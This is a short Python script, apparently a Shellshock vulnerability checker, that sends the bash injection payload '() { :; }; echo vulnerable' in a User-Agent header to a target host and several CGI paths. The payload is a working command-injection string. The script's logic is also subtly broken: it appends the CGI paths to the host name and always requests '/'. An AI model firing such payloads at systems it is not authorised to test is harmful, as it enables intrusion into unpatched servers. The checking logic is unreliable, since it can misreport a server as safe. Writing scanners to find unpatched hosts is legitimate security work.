# Shellshock Checker
# Author: cbk914
import argparse
import http.client

def check_vulnerable(url):
    conn = http.client.HTTPConnection(url)
    headers = {
        "User-Agent": "() { :; }; echo vulnerable"
    }
    conn.request("GET", "/", headers=headers)
    response = conn.getresponse()
    data = response.read()
    conn.close()
    if "vulnerable" in str(data):
        return True
    else:
        return False

def check_shellshock(url):
    vulnerable = False
    vulnerable |= check_vulnerable(url)
    vulnerable |= check_vulnerable(url + "/cgi-bin/test.cgi")
    vulnerable |= check_vulnerable(url + "/cgi-sys/defaultwebpage.cgi")
    vulnerable |= check_vulnerable(url + "/cgi-mod/index.cgi")
    if vulnerable:
        print("VULNERABLE: The target is vulnerable to Shellshock.")
    else:
        print("SAFE: The target is not vulnerable to Shellshock.")

def main():
    parser = argparse.ArgumentParser(description="Check for Shellshock vulnerability")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    args = parser.parse_args()
    check_shellshock(args.url)

if __name__ == "__main__":
    main()
